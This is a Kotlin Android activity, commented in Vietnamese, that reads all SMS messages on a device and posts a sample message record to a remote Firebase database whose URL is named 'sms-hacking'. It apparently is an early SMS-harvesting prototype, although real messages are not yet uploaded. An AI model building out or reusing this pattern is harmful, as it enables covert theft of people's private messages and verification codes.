package com.example.codes.Activitys

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.codes.databinding.ActivityGetSmsBinding
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase

class GetSMS : AppCompatActivity() {

    private val REQUEST_CODE_SMS_PERMISSION = 1
    private lateinit var smsReceiver: BroadcastReceiver

    private val binding: ActivityGetSmsBinding by lazy {
        ActivityGetSmsBinding.inflate(layoutInflater)
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(binding.root)

        // Kiểm tra quyền truy cập vào SMS
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), REQUEST_CODE_SMS_PERMISSION)
        }
        val smsMessageData = mapOf(
            "sender" to "0123456789",            // Số điện thoại người gửi
            "message" to "Hello from Kotlin!",   // Nội dung tin nhắn
            "timestamp" to System.currentTimeMillis()  // Thời gian nhận tin nhắn (dùng mili giây từ Epoch)
        )

        binding.buttonGetMessages.setOnClickListener {
            saveSmsToFirebase(smsMessageData)

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                getAllMessages()
            } else {
                Toast.makeText(this, "Permission is required to read messages.", Toast.LENGTH_SHORT).show()
            }
        }

        // Đăng ký BroadcastReceiver để lắng nghe tin nhắn mới
        smsReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                val message = intent?.getStringExtra("sms_message")
                binding.textViewMessages.text = message
            }
        }

        registerReceiver(smsReceiver, IntentFilter("com.example.codes.NEW_SMS_RECEIVED"),
            RECEIVER_NOT_EXPORTED
        )



    }

    private fun saveSmsToFirebase(smsData: Map<String, Any>) {
        val database: DatabaseReference = FirebaseDatabase.getInstance("https://sms-hacking-8b10c-default-rtdb.asia-southeast1.firebasedatabase.app/").reference
        val smsRef = database.child("sms_messages").push()

        smsRef.setValue(smsData)
            .addOnSuccessListener {
                // Thành công - Thêm tin nhắn vào Firebase
            }
            .addOnFailureListener { e ->
                // Thất bại - Hiển thị lỗi (có thể log)
                e.printStackTrace()
            }
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(smsReceiver)
    }

    private fun getAllMessages() {
        val smsMessages = StringBuilder()
        val cursor = contentResolver.query(
            android.provider.Telephony.Sms.CONTENT_URI, null, null, null, android.provider.Telephony.Sms.DEFAULT_SORT_ORDER
        )

        cursor?.use {
            while (it.moveToNext()) {
                val address = it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.ADDRESS))
                val body = it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.BODY))
                smsMessages.append("From: $address\nMessage: $body\n\n")
            }
            binding.textViewMessages.text = smsMessages.toString()
        }
    }

    // Xử lý kết quả yêu cầu quyền
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE_SMS_PERMISSION) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Permission granted", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show()
            }
        }
    }
}
